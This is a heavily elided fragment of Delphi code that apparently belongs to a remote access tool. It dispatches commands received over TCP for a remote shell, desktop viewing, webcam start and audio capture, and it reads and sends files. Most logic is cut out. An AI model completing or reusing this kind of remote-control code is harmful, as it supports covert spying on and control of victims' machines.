...
var
  ...
  FileSize: int64;
  Resultado: boolean;
  AStream: StreamUnit.TFileStream;
  NewShell: TNewShell;
  TempStr: widestring;
...
begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = SHELLCOMMAND then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = STARTDESKTOP then
  begin
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = WEBCAMSTART then
  begin
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = AUDIOSETTINGS then
  begin
    delete(Recebido, 1, pos('|', Recebido));
...
begin
  ...
  try
    AStream := StreamUnit.TFileStream.Create(FileName, fmOpenRead + fmShareDenyNone);
...
begin
  ...
  try
    ...
    if Tempint > 0 then
    begin
      while (pos(#13#10, TempStr) > 0) and (IdTCPClient1.Connected = true) do
      begin
        TempFile := Copy(TempStr, 1, pos(#13#10, TempStr) - 1);
